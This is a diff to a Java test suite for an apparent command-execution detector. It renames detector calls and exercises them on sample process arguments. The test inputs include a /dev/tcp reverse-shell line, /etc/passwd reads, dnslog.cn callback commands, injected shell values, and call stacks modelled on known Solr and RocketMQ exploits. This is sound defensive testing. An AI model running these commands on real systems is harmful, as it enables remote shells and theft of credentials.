@@ -417,30 +417,30 @@ final class DetectorEngineTest {
   void checksOnlyTheSelectedWindowsInlineProgram() {
     String label = "O'Brien & Sons";
     var input = request(Map.of("label", List.of(label)));
-    assertTrue(engine.detectCommand(List.of("java.exe", "Report", label), input).isEmpty());
-    assertTrue(engine.detectCommand(List.of("powershell.exe", "-File", "report.ps1", label), input).isEmpty());
-    assertTrue(engine.detectCommand(List.of("pwsh", "-cwa", "Write-Output $args[0]", label), input).isEmpty());
+    assertTrue(ProcessDetector.detectCommand(List.of("java.exe", "Report", label), input).isEmpty());
+    assertTrue(ProcessDetector.detectCommand(List.of("powershell.exe", "-File", "report.ps1", label), input).isEmpty());
+    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-cwa", "Write-Output $args[0]", label), input).isEmpty());
     String program = "Write-Output weekly; Write-Output ready";
-    assertTrue(engine.detectCommand(List.of("pwsh", "-Command", program), request(Map.of("label", List.of("weekly")))).isEmpty());
-    assertAlgorithm(engine.detectCommand(List.of("pwsh", "-NoProfile", "-NonInteractive", "-Command", program),
+    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-Command", program), request(Map.of("label", List.of("weekly")))).isEmpty());
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("pwsh", "-NoProfile", "-NonInteractive", "-Command", program),
         request(Map.of("program", List.of(program)))), "command_userinput");
     String afterComment = "<# report | template #> Write-Output weekly; Write-Output ready";
-    assertAlgorithm(engine.detectCommand(List.of("pwsh", "-c", afterComment),
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("pwsh", "-c", afterComment),
         request(Map.of("program", List.of("weekly; Write-Output")))), "command_userinput");
-    assertTrue(engine.detectCommand(List.of("pwsh", "-c", afterComment),
+    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-c", afterComment),
         request(Map.of("description", List.of("report | template")))).isEmpty());
-    assertAlgorithm(engine.detectCommand(List.of("pwsh", "-Command", "Write-Output item#tag; Write-Output ready"),
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("pwsh", "-Command", "Write-Output item#tag; Write-Output ready"),
         request(Map.of("program", List.of("tag; Write-Output")))), "command_userinput");
     String literal = "Write-Output 'Sales & Reports'";
-    assertTrue(engine.detectCommand(List.of("pwsh", "-Command", literal), request(Map.of("label", List.of(literal)))).isEmpty());
-    assertTrue(engine.detectCommand(List.of("cmd", "/d", "/c", "echo", "Sales & Reports"),
+    assertTrue(ProcessDetector.detectCommand(List.of("pwsh", "-Command", literal), request(Map.of("label", List.of(literal)))).isEmpty());
+    assertTrue(ProcessDetector.detectCommand(List.of("cmd", "/d", "/c", "echo", "Sales & Reports"),
         request(Map.of("label", List.of("Sales & Reports")))).isEmpty());
   }
 
   @Test
   void detectsCommandUserInput() {
     var result =
-        engine.detectCommand(
+        ProcessDetector.detectCommand(
             List.of("sh", "-c", "echo ok; cat /etc/passwd"),
             request(Map.of("cmd", List.of("cat /etc/passwd"))));
 
@@ -451,20 +451,20 @@ final class DetectorEngineTest {
   @Test
   void separatesShellSourceFromProcessArguments() {
     var input = request(Map.of("text", List.of("sales|sh", "O'Brien")));
-    assertTrue(engine.detectCommand(List.of("printf", "%s", "sales|sh"), input).isEmpty());
-    assertTrue(engine.detectCommand(List.of("sh", "-c", "printf '%s' \"$1\"", "--", "O'Brien"), input).isEmpty());
-    assertTrue(engine.detectCommand(List.of("sh", "-c", "printf '%s' 'sales|sh'; printf done"), input).isEmpty());
-    assertTrue(engine.detectCommand(List.of("sh", "-c", "printf ok | cat"), request()).isEmpty());
-    assertAlgorithm(engine.detectCommand(List.of("/usr/bin/env", "LC_ALL=C", "/bin/sh", "-lc",
+    assertTrue(ProcessDetector.detectCommand(List.of("printf", "%s", "sales|sh"), input).isEmpty());
+    assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", "printf '%s' \"$1\"", "--", "O'Brien"), input).isEmpty());
+    assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", "printf '%s' 'sales|sh'; printf done"), input).isEmpty());
+    assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", "printf ok | cat"), request()).isEmpty());
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("/usr/bin/env", "LC_ALL=C", "/bin/sh", "-lc",
         "printf ok; date"), request(Map.of("job", List.of("date")))), "command_userinput");
   }
 
   @Test
   void checksFileReaderOperandsAtLaunch() {
-    assertAlgorithm(engine.detectCommand(List.of("/bin/cat", "--", "/etc/passwd"), request()), "command_common");
-    assertTrue(engine.detectCommand(List.of("cat", "/etc/passwd.example"), request()).isEmpty());
-    assertTrue(engine.detectCommand(List.of("cat", "--help", "/etc/passwd"), request()).isEmpty());
-    assertAlgorithm(engine.detectCommand(List.of("/usr/bin/env", "LC_ALL=C", "sh", "-c", "cat /etc/passwd"),
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("/bin/cat", "--", "/etc/passwd"), request()), "command_common");
+    assertTrue(ProcessDetector.detectCommand(List.of("cat", "/etc/passwd.example"), request()).isEmpty());
+    assertTrue(ProcessDetector.detectCommand(List.of("cat", "--help", "/etc/passwd"), request()).isEmpty());
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("/usr/bin/env", "LC_ALL=C", "sh", "-c", "cat /etc/passwd"),
         request()), "command_common");
   }
 
@@ -472,17 +472,17 @@ final class DetectorEngineTest {
   void literalOutputDoesNotExemptOtherShellOperations() {
     for (String program : List.of("printf '%s' weekly\ncat /etc/passwd", "REPORT=/bin/echo cat /etc/passwd",
         "printf %s weekly; cat /etc/passwd", "eval 'cat /etc/passwd' # report")) {
-      assertAlgorithm(engine.detectCommand(List.of("sh", "-c", program), request()), "command_common");
+      assertAlgorithm(ProcessDetector.detectCommand(List.of("sh", "-c", program), request()), "command_common");
     }
     for (String program : List.of("echo 'guide: cat /etc/passwd'", "printf 'percent %% [%8.3s]' 'cat /etc/passwd'")) {
-      assertTrue(engine.detectCommand(List.of("sh", "-c", program), request()).isEmpty(), program);
+      assertTrue(ProcessDetector.detectCommand(List.of("sh", "-c", program), request()).isEmpty(), program);
     }
-    assertAlgorithm(engine.detectCommand(List.of("sh", "-c", "/bin/cat -- '/etc/'passwd"), request()), "command_common");
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("sh", "-c", "/bin/cat -- '/etc/'passwd"), request()), "command_common");
   }
 
   @Test
   void detectsCommonDangerousCommand() {
-    var result = engine.detectCommand(List.of("bash", "-i", ">&", "/dev/tcp/127.0.0.1/4444"), request());
+    var result = ProcessDetector.detectCommand(List.of("bash", "-i", ">&", "/dev/tcp/127.0.0.1/4444"), request());
 
     assertTrue(result.isPresent());
     assertEquals("command_common", result.orElseThrow().algorithm());
@@ -492,13 +492,13 @@ final class DetectorEngineTest {
   void detectsReflectiveCommandStack() {
     var args = List.of("id");
     var direct = List.of("java.lang.ProcessImpl", "java.lang.ProcessBuilder", "java.lang.reflect.Method");
-    assertTrue(engine.detectCommand(args, request(), direct).isEmpty());
-    assertTrue(engine.detectCommand(args, request(), direct, true).orElseThrow().requiresExplicitRule());
+    assertTrue(ProcessDetector.detectCommand(args, request(), direct).isEmpty());
+    assertTrue(ProcessDetector.detectCommand(args, request(), direct, true).orElseThrow().requiresExplicitRule());
     var caller = List.of("java.lang.ProcessImpl", "java.lang.ProcessBuilder", "example.Report",
         "java.lang.reflect.Method");
-    assertTrue(engine.detectCommand(args, request(), caller, true).isEmpty());
+    assertTrue(ProcessDetector.detectCommand(args, request(), caller, true).isEmpty());
     var result =
-        engine.detectCommand(
+        ProcessDetector.detectCommand(
             List.of("id"), request(), List.of("java.lang.reflect.Method", "example.Shell"), true);
 
     assertAlgorithm(result, "command_reflect");
@@ -507,7 +507,7 @@ final class DetectorEngineTest {
   @Test
   void detectsSpringExpressionCommandStack() {
     var result =
-        engine.detectCommand(
+        ProcessDetector.detectCommand(
             List.of("id"),
             request(),
             List.of(
@@ -520,7 +520,7 @@ final class DetectorEngineTest {
   @Test
   void detectsGroovyCommandStack() {
     var result =
-        engine.detectCommand(
+        ProcessDetector.detectCommand(
             List.of("id"),
             request(),
             List.of("org.codehaus.groovy.runtime.ProcessGroovyMethods"));
@@ -531,7 +531,7 @@ final class DetectorEngineTest {
   @Test
   void detectsGremlinGroovyCommandStack() {
     var result =
-        engine.detectCommand(
+        ProcessDetector.detectCommand(
             List.of("id"),
             request(),
             List.of("org.apache.tinkerpop.gremlin.groovy.jsr223.GremlinGroovyScriptEngine"));
@@ -542,14 +542,14 @@ final class DetectorEngineTest {
   @Test
   void unrelatedExecutableListenerCanRunAnOrdinaryReportCommand() {
     for (String owner : List.of("example.reports.RunExecutableListener", "example.Jobs$RunExecutableListener")) {
-      assertTrue(engine.detectCommand(List.of("/usr/bin/printf", "weekly"), request(), List.of(owner)).isEmpty());
+      assertTrue(ProcessDetector.detectCommand(List.of("/usr/bin/printf", "weekly"), request(), List.of(owner)).isEmpty());
     }
   }
 
   @Test
   void detectsSolrCve201712629ConfiguredExecutableListenerCommandStack() {
     var result =
-        engine.detectCommand(
+        ProcessDetector.detectCommand(
             List.of("sh", "-c", "touch /tmp/success"),
             request(),
             List.of("org.apache.solr.core.RunExecutableListener"));
@@ -563,7 +563,7 @@ final class DetectorEngineTest {
   @Test
   void detectsRocketMqCve202333246RuntimeConfigCommandLauncherStack() {
     var result =
-        engine.detectCommand(
+        ProcessDetector.detectCommand(
             List.of("sh", "-c", "touch /tmp/success"),
             RequestContext.empty(),
             List.of(
@@ -580,7 +580,7 @@ final class DetectorEngineTest {
   @Test
   void detectsRhinoJavascriptCommandStack() {
     var result =
-        engine.detectCommand(
+        ProcessDetector.detectCommand(
             List.of("sh", "-c", "id"),
             request(),
             List.of(
@@ -593,7 +593,7 @@ final class DetectorEngineTest {
   @Test
   void detectsTemplateCommandStack() {
     var result =
-        engine.detectCommand(
+        ProcessDetector.detectCommand(
             List.of("id"),
             request(),
             List.of("freemarker.template.utility.Execute"));
@@ -603,14 +603,14 @@ final class DetectorEngineTest {
 
   @Test
   void ignoresPlainLowSignalCommandWithoutRuntimeStack() {
-    var result = engine.detectCommand(List.of("id"), request());
+    var result = ProcessDetector.detectCommand(List.of("id"), request());
 
     assertTrue(result.isEmpty());
   }
 
   @Test
   void ignoresLowSignalTouchCommandWithoutExecutableListenerStack() {
-    var result = engine.detectCommand(List.of("sh", "-c", "touch /tmp/success"), request());
+    var result = ProcessDetector.detectCommand(List.of("sh", "-c", "touch /tmp/success"), request());
 
     assertTrue(result.isEmpty());
   }
@@ -618,7 +618,7 @@ final class DetectorEngineTest {
   @Test
   void ignoresLowSignalTouchWithOrdinarySchedulerStack() {
     var result =
-        engine.detectCommand(
+        ProcessDetector.detectCommand(
             List.of("sh", "-c", "touch /tmp/success"),
             RequestContext.empty(),
             List.of("java.util.concurrent.ScheduledThreadPoolExecutor"));
@@ -628,7 +628,7 @@ final class DetectorEngineTest {
 
   @Test
   void detectsCommandSyntaxError() {
-    var result = engine.detectCommand(List.of("sh", "-c", "echo 'unterminated"), request());
+    var result = ProcessDetector.detectCommand(List.of("sh", "-c", "echo 'unterminated"), request());
 
     assertAlgorithm(result, "command_error");
   }
@@ -641,7 +641,7 @@ final class DetectorEngineTest {
         List.of("wget", "-O", "report", "https://reports.invalid", "abc.dnslog.cn/a"),
         List.of("ping", "abc.dnslog.cn."), List.of("nslookup", "abc.dnslog.cn"),
         List.of("dig", "abc.dnslog.cn"))) {
-      var result = engine.detectCommand(argv, request());
+      var result = ProcessDetector.detectCommand(argv, request());
       assertAlgorithm(result, "command_dnslog");
       assertEquals("abc.dnslog.cn", result.orElseThrow().details().get("host"));
     }
@@ -659,7 +659,7 @@ final class DetectorEngineTest {
         List.of("wget", "-O", "abc.dnslog.cn", "https://reports.invalid/"),
         List.of("curl", "https://abc.dnslog.cn/", "--version"),
         List.of("dig", "-f", "abc.dnslog.cn"))) {
-      assertTrue(engine.detectCommand(argv, request()).isEmpty(), argv.toString());
+      assertTrue(ProcessDetector.detectCommand(argv, request()).isEmpty(), argv.toString());
     }
   }
 
@@ -2754,7 +2754,7 @@ final class DetectorEngineTest {
   @Test
   void detectsWebshellCommand() {
     var result =
-        engine.detectWebshellCommand(
+        ProcessDetector.detectWebshellCommand(
             List.of("sh", "-c", "id"), request(Map.of("cmd", List.of("sh -c id"))));
 
     assertAlgorithm(result, "webshell_command");
